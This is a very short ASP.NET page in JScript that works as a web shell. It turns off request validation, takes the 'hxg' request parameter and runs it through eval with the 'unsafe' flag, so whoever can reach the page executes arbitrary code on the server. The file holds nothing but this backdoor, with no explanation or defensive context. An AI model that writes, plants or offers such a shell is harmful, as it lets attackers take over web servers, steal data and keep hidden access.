<%@ Page Language="Jscript" validateRequest="false" %>
<%
var keng 
keng = Request.Item["hxg"];
Response.Write(eval(keng,"unsafe"));
%>
